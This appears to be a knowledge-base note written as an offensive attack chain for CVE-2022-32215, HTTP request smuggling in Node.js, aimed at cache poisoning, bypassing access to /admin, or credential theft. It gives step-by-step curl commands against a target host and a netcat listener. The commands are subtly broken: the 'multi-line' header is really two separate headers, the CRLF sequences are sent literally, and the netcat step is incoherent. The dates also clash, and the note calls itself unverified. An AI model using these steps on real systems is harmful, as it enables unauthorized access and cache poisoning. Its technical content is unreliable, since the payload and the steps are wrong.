---
tags:
  - http-request-smuggling
  - node-js
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-request]]'
  - '[[commands/netcat-listen]]'
platforms:
  - Web
  - Node.js
complexity: medium
procedures:
  - '[[procedures/Identify-Vulnerable-Node-js-Application]]'
  - '[[procedures/Craft-Multi-line-Transfer-Encoding-Request]]'
  - '[[procedures/Exploit-for-Cache-Poisoning-or-Bypass]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of CVE-2022-32215 in Node.js leading to HTTP Request Smuggling
  for cache poisoning or credential theft
skill_level: intermediate
impact_level: high
id: 7d2206ec-3c59-4b5f-99d3-497bfec1a0ee
created_at: '2025-12-13T09:01:17.298Z'
updated_at: '2025-12-13T09:01:17.298Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling via Multi-line Transfer-Encoding in Node.js

Multi-stage attack chain exploiting CVE-2022-32215 in Node.js's llhttp parser, allowing HTTP Request Smuggling through incorrect handling of multi-line Transfer-Encoding headers. This can lead to cache poisoning, security bypass, or credential theft in affected Node.js versions (14.x, 16.x, 18.x).

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance] --> B[Request Crafting] --> C[Exploitation]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools
- [[tools/Curl]]

### Target Environment
- Node.js application (versions 14.x, 16.x, or 18.x)
- Web server with potential front-end/back-end mismatch
- Network access to the target HTTP endpoint

### Initial Access Requirements
- Ability to send HTTP requests to the target
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Node.js Application
procedure: [[procedures/Identify-Vulnerable-Node-js-Application]]

**Objective**: Scan and confirm the target is running a vulnerable version of Node.js with llhttp parser.

**Instructions**: Use [[commands/curl-http-request]] to probe the target's HTTP headers for Node.js indicators:

```bash
curl -I http://target.com
```

Check for server headers indicating Node.js. Then, verify version via known endpoints or banners if available.

**Expected Output**: HTTP response headers showing 'Server: Node.js' or similar.

**Success Indicators**:
- Target confirmed as Node.js
- Version matches vulnerable lines (14.x, 16.x, 18.x)

### Step 2: Craft Multi-line Transfer-Encoding Request
procedure: [[procedures/Craft-Multi-line-Transfer-Encoding-Request]]

**Objective**: Create a specially crafted HTTP request with multi-line Transfer-Encoding to trigger the parsing flaw.

**Instructions**: Use [[commands/curl-http-request]] to send a request with multi-line Transfer-Encoding:

```bash
curl -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: gzip" --data "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com
```

This attempts to smuggle a secondary request.

**Expected Output**: Response indicating desynchronization between front-end and back-end parsing.

**Success Indicators**:
- Request accepted without error
- Evidence of smuggling (e.g., unexpected response)

### Step 3: Exploit for Cache Poisoning or Bypass
procedure: [[procedures/Exploit-for-Cache-Poisoning-or-Bypass]]

**Objective**: Leverage the smuggling to perform cache poisoning or bypass security controls.

**Instructions**: Use [[commands/netcat-listen]] to potentially capture smuggled responses if needed, or repeat crafted requests to poison cache:

```bash
nc -lvnp 80
```

Combine with the previous curl to smuggle poisoned content.

**Expected Output**: Cached responses altered or security bypassed.

**Success Indicators**:
- Cache poisoned (e.g., malicious content served)
- Credentials stolen or layers bypassed

## Attack Chain Summary

### Key Achievements
1. Identified vulnerable Node.js target
2. Crafted and sent smuggling request
3. Achieved impact like cache poisoning

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics
- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01T00:00:00Z*
